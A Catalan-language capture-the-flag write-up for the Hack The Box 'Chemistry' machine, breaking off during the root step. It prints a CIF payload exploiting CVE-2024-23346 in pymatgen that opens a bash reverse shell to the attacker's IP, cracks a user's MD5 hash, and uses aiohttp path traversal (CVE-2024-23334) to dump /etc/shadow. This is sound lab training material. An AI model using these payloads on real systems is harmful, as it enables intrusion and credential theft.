Primer de tot fem un nmap per veure els ports que hi ha oberts a la màquina víctima:

```
──(polkali㉿kaliPol)-[~]
└─$ nmap -sC -sV -v 10.10.11.38         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 19:09 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating NSE at 19:09
Completed NSE at 19:09, 0.00s elapsed
Initiating NSE at 19:09
Completed NSE at 19:09, 0.01s elapsed
Initiating Ping Scan at 19:09
Scanning 10.10.11.38 [2 ports]
Completed Ping Scan at 19:09, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:09
Completed Parallel DNS resolution of 1 host. at 19:09, 0.01s elapsed
Initiating Connect Scan at 19:09
Scanning 10.10.11.38 [1000 ports]
Discovered open port 22/tcp on 10.10.11.38
Discovered open port 5000/tcp on 10.10.11.38
Completed Connect Scan at 19:09, 2.11s elapsed (1000 total ports)
Initiating Service scan at 19:09
Scanning 2 services on 10.10.11.38
Completed Service scan at 19:10, 95.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.38.
Initiating NSE at 19:10
Completed NSE at 19:10, 1.63s elapsed
Initiating NSE at 19:10
Completed NSE at 19:10, 1.10s elapsed
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Nmap scan report for 10.10.11.38
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Mon, 04 Nov 2024 18:09:13 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=11/4%Time=67290DC5%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Mon,\x2004\x20Nov\x202024\x2018:09:13\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Initiating NSE at 19:10
Completed NSE at 19:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.83 seconds

```

Ens trobem amb el port 22 obert per SSH i el port 5000 hi ha Werkzeug que és una completa biblioteca d'aplicacions web WSGI, hi podem accedir a través d'un navegador, i ho sabem perquè ens dona un 200 per HTTP. Va començar com una simple col·lecció de diverses utilitats per a aplicacions WSGI i s'ha convertit en una de les biblioteques d'utilitats WSGI més avançades.

Ara provarem d'accedir a la pàgina pel port 5000 i ens trobem això (ara afegeixo també chemistry.htb al fitxer /etc/hosts):

![image](https://github.com/user-attachments/assets/7f349e83-1dc5-4df4-a04b-62ba22c4e936)


Veiem que hi ha un analitzador CIF, una eina especialitzada destinada a l'anàlisi dels fitxers CIF. Sembla que aquesta eina analítica dóna funcionalitats que faciliten l'avaluació de la integritat i la qualitat de les dades.

Com que ens podem registrar o bé iniciar sessió, provarem de crear-nos un compte.

![image](https://github.com/user-attachments/assets/ffa90677-a4ad-4a3a-be32-75e3ad9026c9)


Un cop registrats, tenim una pàgina que ens permet pujar fitxers CIF:

![image](https://github.com/user-attachments/assets/cc7fd9d7-0617-4b3e-9703-e6594e5e7c45)



Com que no sé que són els fitxers CIF he buscat per internet hi he trobat que són Arxiu d'Informació Cristalogràfica i és el format estàndard per facilitar l'intercanvi de dades cristal·logràfiques i va ser publicat per primera vegada per Hall, Allen i Brown el 1991.

El seu ús principal: Unió Internacional de Cristal·lografia (IUCr) ha triat el format de fitxer CIF com a estàndard per emmagatzemar i compartir informació cristal·logràfica. 

Pel que veiem, sembla que haurem de trobar la manera i forma de modificar i explotar fitxers CIF per poder obtenir una reverse shell. 

Al propi dashboard hi ha un exemple a descarregar d'un fitxer CIF:

![image](https://github.com/user-attachments/assets/7ed6d14c-feed-41b9-a6ff-21b007b4aafd)


Després de no saber ben bé què fer amb aquest fitxer CIF, he pensat que podria buscar patrons que resultin en algun exploit dels fitxers CIF, d'aquest en concret.

Després de donar vàries voltes per internet i durant força hores, veig una persona que ja havia fet aquesta màquina que ha trobat com a través d'aquest CVE: https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0  fa un fitxer CIF amb el següent codi que conté una descripció de l'estructura CIF però amb una ordre incrustada que intenta aprofitar la resolució d'atributs de Python per crear una reverse shell. 

Aquí podem trobar més informació al respecte: [https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0](https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0) i aquí https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

Llavors, hem d'afegir al fitxer d'exemple descarregat, l'example.cif aquestes línies a sota de tot, posant la nostra IP i el port per on escoltarem per crear la reverse shell:

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.146/4444 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```


Un cop fet això pugem el fitxer al dashboard una vegada ja tinguem una consola escoltant:

```
`┌──(polkali㉿kaliPol)-[~]
└─$ nc -nlvp 4444              
listening on [any] 4444 ...`
```

Un cop hem pujat el fitxer modificat hem de clicar a View i és quan se'ns crearà la reverse shell:

![image](https://github.com/user-attachments/assets/8b70d69c-ecdd-4073-93a8-a7211a446942)


```
`┌──(polkali㉿kaliPol)-[~]
└─$ nc -nlvp 4444              
listening on [any] 4444 ...
connect to [10.10.14.146] from (UNKNOWN) [10.10.11.38] 53120
sh: 0: can't access tty; job control turned off
$ whoami
app
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
$ `
```

Després de força investigació, veig que la user flag es troba al directori d'un altre usuari que hi ha, que es diu rosa, però no podem llegir la flag amb l'usuari app que estem, per tant hem de trobar les credencials de l'usuari rosa:

```
$ ls -la rosa
total 876
drwxr-xr-x 7 rosa rosa   4096 Nov  4 19:16 .
drwxr-xr-x 4 root root   4096 Jun 16 23:10 ..
lrwxrwxrwx 1 root root      9 Jun 17 01:50 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rosa rosa   3771 Feb 25  2020 .bashrc
drwx------ 2 rosa rosa   4096 Jun 15 20:38 .cache
drwxrwxr-x 4 rosa rosa   4096 Nov  4 16:21 CVE-2021-3156
-rwxrw-r-- 1 rosa rosa    462 Nov  4 19:15 exploit.sh
drwx------ 3 rosa rosa   4096 Nov  4 18:50 .gnupg
-rwxrwxr-x 1 rosa rosa 847834 Nov  4 16:09 linpeas.sh
drwxrwxr-x 4 rosa rosa   4096 Jun 16 16:04 .local
-rw-r--r-- 1 rosa rosa    807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root      9 Jun 17 01:51 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa   4096 Jun 15 18:24 .ssh
-rw-r--r-- 1 rosa rosa      0 Jun 15 20:43 .sudo_as_admin_successful
-rw-r----- 1 root rosa     33 Nov  4 15:36 user.txt
$ cd rosa
$ cat user.txt
cat: user.txt: Permission denied
$ 
```

 Veiem que hi ha Linpeas, per tant aprofitem per executar-lo ja que podem si ens fixem en els permisos:

![image](https://github.com/user-attachments/assets/bde93a8c-04c6-4a9f-9605-32000afbc90b)


Gràcies a Linpeas veiem que hi ha el fitxer ``/home/app/instance/database.db`` que sembla prometedor ja que Linpeas ens el marca com a taula llegible de BD:

![image](https://github.com/user-attachments/assets/387d522f-94d5-4a0d-965a-279865346a8a)


I aquí dins veiem que hi ha en format hash les password dels usuaris ja que si ens hi fixem bé, hi apareix l'usuari pol que he creat per poder pujar fitxers CIF al servidor a través del dashboard.

Ara, gràcies a trobar el hash de la password de l'usuari rosa: ``63ed86ee9f624c7b14f1d4f43dc251a5`` mirarem de crackejar-lo. Primer el desem a un fitxer hash:

``echo '63ed86ee9f624c7b14f1d4f43dc251a5' > hash``

I ara crackejem el hash d'aquest fitxer amb hashcat:
 
```
`┌──(polkali㉿kaliPol)-[~/Documents/Chemistry]
└─$ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2212/4489 MB (1024 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
Time.Started.....: Mon Nov  4 21:41:22 2024 (1 sec)
Time.Estimated...: Mon Nov  4 21:41:23 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3969.7 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2982912/14344385 (20.79%)
Rejected.........: 0/2982912 (0.00%)
Restore.Point....: 2981376/14344385 (20.78%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: unikkatilgsgs -> ungidas07
Hardware.Mon.#1..: Util: 53%

Started: Mon Nov  4 21:40:46 2024
Stopped: Mon Nov  4 21:41:25 2024`
```

I obtenim la password amb la qual intentarem connectar-nos amb l'usuari rosa per ssh per poder llegir la user flag:

```
┌──(polkali㉿kaliPol)-[~]
└─$ ssh rosa@10.10.11.38                              
The authenticity of host '10.10.11.38 (10.10.11.38)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.38' (ED25519) to the list of known hosts.
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 04 Nov 2024 08:44:45 PM UTC

  System load:  0.01              Processes:             269
  Usage of /:   84.9% of 5.08GB   Users logged in:       1
  Memory usage: 36%               IPv4 address for eth0: 10.10.11.38
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Nov  4 20:41:09 2024 from 10.10.16.71
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
rosa@chemistry:~$ whoami
rosa
rosa@chemistry:~$ pwd
/home/rosa
rosa@chemistry:~$ cat user.txt 
f5d75176ef10de4d12a98afd62e27f56
rosa@chemistry:~$ 

```

I ja tenim la user flag:


![image](https://github.com/user-attachments/assets/7cbd0c2a-658a-463f-ac09-9bee684dae03)

Ara buscarem la forma d'escalar privilegis per poder tenir accés amb l'usuari root i obtenir la seva flag.

He tornat a tirar Linpeas, i mirant tots els apartats veiem que, hi ha una web corrent per el port localhost 127.0.0.1:8080, per tant provarem de fer un curl a veure què trobem que ens pugui ser útil:


```

rosa@chemistry:~$ curl localhost:8080

<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Site Monitoring</title>

    <link rel="stylesheet" href="/assets/css/all.min.css">

    <script src="/assets/js/jquery-3.6.0.min.js"></script>

    <script src="/assets/js/chart.js"></script>

    <link rel="stylesheet" href="/assets/css/style.css">

    <style>

    h2 {

      color: black;

      font-style: italic;

    }

  
  

    </style>

</head>

<body>

    <nav class="navbar">

        <div class="container">

            <h1 class="logo"><i class="fas fa-chart-line"></i> Site Monitoring</h1>

            <ul class="nav-links">

                <li><a href="#" id="home"><i class="fas fa-home"></i> Home</a></li>

                <li><a href="#" id="start-service"><i class="fas fa-play"></i> Start Service</a></li>

                <li><a href="#" id="stop-service"><i class="fas fa-stop"></i> Stop Service</a></li>

                <li><a href="#" id="list-services"><i class="fas fa-list"></i> List Services</a></li>

                <li><a href="#" id="check-attacks"><i class="fas fa-exclamation-triangle"></i> Check Attacks</a></li>

            </ul>

        </div>

    </nav>

  

    <div class="container">

        <div id="earnings">

            <h2>2023 Earnings</h2>

            <canvas id="earningsChart"></canvas>

        </div>

        <div id="views">

            <h2>Views per Month</h2>

            <canvas id="viewsChart"></canvas>

        </div>

        <div id="ad-clicks">

            <h2>Ad Clicks per Visit</h2>

            <canvas id="adClicksChart"></canvas>

        </div>

        <div id="service-list" style="display:none;">

            <h2>Service List</h2>

            <ul id="service-list-content">

                <!-- Will be filled dynamically with JavaScript -->

            </ul>

        </div>

        <div id="attack-logs" style="display:none;">

            <h2>Possible Attacks</h2>

            <h3><p style="color:red;">Functionality currently under development</p></h3>

            <ul id="attack-logs-content">

            </ul>

        </div>

        <div class="loader" id="loader" style="display:none;">Loading...</div>

    </div>

  

    <script src="/assets/js/script.js"></script>

  

    <script>

        document.addEventListener('DOMContentLoaded', function () {

            const earnings = {"April": 3000, "August": 5000, "February": 2000, "January": 1500, "July": 4500, "June": 4000, "March": 2500, "May": 3500, "September": 5500};

            const views = {"April": 40000, "August": 60000, "February": 30000, "January": 25000, "July": 55000, "June": 50000, "March": 35000, "May": 45000, "September": 65000};

            const adClicks = {"Ad1": 650, "Ad2": 200, "Ad3": 1000};

  

            // Earnings Chart Configuration

            const earningsCtx = document.getElementById('earningsChart').getContext('2d');

            const earningsChart = new Chart(earningsCtx, {

                type: 'bar',

                data: {

                    labels: Object.keys(earnings),

                    datasets: [{

                        label: 'Earnings ($)',

                        data: Object.values(earnings),

                        backgroundColor: 'rgba(75, 192, 192, 0.2)',

                        borderColor: 'rgba(75, 192, 192, 1)',

                        borderWidth: 1

                    }]

                },

                options: {

                    responsive: true,

                    scales: {

                        y: {

                            beginAtZero: true

                        }

                    }

                }

            });

  

            // Views Chart Configuration

            const viewsCtx = document.getElementById('viewsChart').getContext('2d');

            const viewsChart = new Chart(viewsCtx, {

                type: 'line',

                data: {

                    labels: Object.keys(views),

                    datasets: [{

                        label: 'Views',

                        data: Object.values(views),

                        backgroundColor: 'rgba(153, 102, 255, 0.2)',

                        borderColor: 'rgba(153, 102, 255, 1)',

                        borderWidth: 1

                    }]

                },

                options: {

                    responsive: true,

                    scales: {

                        y: {

                            beginAtZero: true

                        }

                    }

                }

            });

  

            // Ad Clicks Chart Configuration

            const adClicksCtx = document.getElementById('adClicksChart').getContext('2d');

            const adClicksChart = new Chart(adClicksCtx, {

                type: 'pie',

                data: {

                    labels: Object.keys(adClicks),

                    datasets: [{

                        label: 'Clicks',

                        data: Object.values(adClicks),

                        backgroundColor: [

                            'rgba(255, 99, 132, 0.2)',

                            'rgba(54, 162, 235, 0.2)',

                            'rgba(255, 206, 86, 0.2)',

                            'rgba(75, 192, 192, 0.2)',

                            'rgba(153, 102, 255, 0.2)',

                            'rgba(255, 159, 64, 0.2)'

                        ],

                        borderColor: [

                            'rgba(255, 99, 132, 1)',

                            'rgba(54, 162, 235, 1)',

                            'rgba(255, 206, 86, 1)',

                            'rgba(75, 192, 192, 1)',

                            'rgba(153, 102, 255, 1)',

                            'rgba(255, 159, 64, 1)'

                        ],

                        borderWidth: 1

                    }]

                },

                options: {

                    responsive: true

                }

            });

        });

    </script>

</body>

</html>

```


Sembla un lloc web per monitoritzar alguna cosa. Com que no hem aconseguit res farem un curl per obtenir les capçaleres, a veure si així obtenim alguna informació valuosa:

```

rosa@chemistry:~$ curl localhost:8080 --head

HTTP/1.1 200 OK

Content-Type: text/html; charset=utf-8

Content-Length: 5971

Date: Thu, 07 Nov 2024 21:04:17 GMT

Server: Python/3.9 aiohttp/3.9.1

```
  
A server veiem que hi ha la versió de python i aiohttp que no sé què és, farem una cerca a internet a veure si trobem algun CVE i/o POC sobre aquestes versions.

Sobre Python no trobem res: Known vulnerabilities in the python-3.9 package. This does not include vulnerabilities belonging to this package's dependencies.

Per tant anem a mirar sobre aiohttp, primer de tot, com que no conec aiohttp he fet una cerca per veure què és: aiohttp és un framework client/servidor HTTP asíncron per asyncio i Python. Un cop fet això, vaig a buscar a veure si trobo algun CVE per aquesta versióde aiohtpp.

He trobat diversos POC que es podrien utilitzar i que són sobre LFI/Path Traversal : https://github.com/z3rObyte/CVE-2024-23334-PoC , https://github.com/wizarddos/CVE-2024-23334 .

Si examinem l'exploit.sh del primer repositori que he documentat, veiem que hi ha la següent comanda per explotar la vulnerabilitat de Path Traversal `curl --path-as-is -s -o /dev/null`, per tant, puc provar de fer-ho de forma manual a veure si puc aconseguir la flag de root. Com que no funcionava tal qual estava a l'script del repositori de GitHub, he mirat bé la comanda i -o no s'ha de posar perquè és per especificar un fitxer de sortida cosa que ara mateix no vull fer, per tant queda la comanda així amb la qual obtenim resultats:

```

rosa@chemistry:~$ curl --path-as-is -s http://localhost:8080/dev/null

404: Not Found

```

Ara doncs, començaré a jugar a assaig-error a veure si vaig trobant alguna cosa. Després de posar 4 ../ puc visualitzar com si de cat es tractés fitxers, per exemple he aconseguit:

```

rosa@chemistry:/$ curl -s --path-as-is http://localhost:8080/assets/../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin

systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin

systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin

messagebus:x:103:106::/nonexistent:/usr/sbin/nologin

syslog:x:104:110::/home/syslog:/usr/sbin/nologin

_apt:x:105:65534::/nonexistent:/usr/sbin/nologin

tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false

uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin

tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin

landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin

pollinate:x:110:1::/var/cache/pollinate:/bin/false

fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin

usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

sshd:x:113:65534::/run/sshd:/usr/sbin/nologin

systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

rosa:x:1000:1000:rosa:/home/rosa:/bin/bash

lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false

app:x:1001:1001:,,,:/home/app:/bin/bash

_laurel:x:997:997::/var/log/laurel:/bin/false

```

I si mirem el shadow tenim les contrasenyes:

```

rosa@chemistry:/$ curl -s --path-as-is http://localhost:8080/assets/../../../../etc/shadow

root:$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.:19891:0:99999:7:::

daemon:*:19430:0:99999:7:::

bin:*:19430:0:99999:7:::

sys:*:19430:0:99999:7:::

sync:*:19430:0:99999:7:::

games:*:19430:0:99999:7:::

man:*:19430:0:99999:7:::

lp:*:19430:0:99999:7:::

mail:*:19430:0:99999:7:::

news:*:19430:0:99999:7:::

uucp:*:19430:0:99999:7:::

proxy:*:19430:0:99999:7:::

www-data:*:19430:0:99999:7:::

backup:*:19430:0:99999:7:::

list:*:19430:0:99999:7:::

irc:*:19430:0:99999:7:::

gnats:*:19430:0:99999:7:::

nobody:*:19430:0:99999:7:::

systemd-network:*:19430:0:99999:7:::

systemd-resolve:*:19430:0:99999:7:::

systemd-timesync:*:19430:0:99999:7:::

messagebus:*:19430:0:99999:7:::

syslog:*:19430:0:99999:7:::

_apt:*:19430:0:99999:7:::

tss:*:19430:0:99999:7:::

uuidd:*:19430:0:99999:7:::

tcpdump:*:19430:0:99999:7:::

landscape:*:19430:0:99999:7:::

pollinate:*:19430:0:99999:7:::

fwupd-refresh:*:19430:0:99999:7:::

usbmux:*:19889:0:99999:7:::

sshd:*:19889:0:99999:7:::

systemd-coredump:!!:19889::::::

rosa:$6$giyD4I2YumzG4k6.$0h0Gtrjj13qoK6m0XevedDBanbEz6BStzsLwUtrDm5sVkmnHOSSWF8f6W8B9btTEzyskmA2h/7F7gyvX1fzrT0:19893:0:99999:7:::

lxd:!:19889::::::

app:$6$XUL17hADm4qICsPv$QvCHMOImUTmS1jiaTQ2t6ZJtDAzgkqRhFYOMd0nty3lLwpyxTiyMWRgO/jbySPENinpJlL0z3MK1OVEaG44sQ1:19890:0:99999:7:::

_laurel:!:20007::::::

```

Ara doncs, es tracta de desencriptar la contrasenya de l'usuari root, o bé, podria provar a veure si aconsegueixo d'arribar a la ruta de la flag de root, que serà root.txt com sempre.

1. Crackejar el hash:

Tenim que el hash és el següent `$6$51.cQv3bNpiiUadY$0qMYr0nZDIHuPMZuR4e7Lirpje9PwW666fRaPKI8wTaTVBm5fgkaBEojzzjsF.jjH0K0JWi3/poCT6OfBkRpl.` Ara el podem crackejar amb John the ripper o hashcat per exemple:


```

┌──(kali㉿kali)-[~/Documents/Chemistry]

└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

  

Using default input encoding: UTF-8

Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])

Cost 1 (iteration count) is 5000 for all loaded hashes

Will run 3 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status


``` 

Mentre es crackeja el hash per obtenir la contrasenya, he provat la segona opció:


2. Trobar i llegir la flag de root sabent que el nom ha de ser root.txt i que es trobarà al directori root que està a l'arrel:


```

rosa@chemistry:~$ cd /

rosa@chemistry:/$ ls

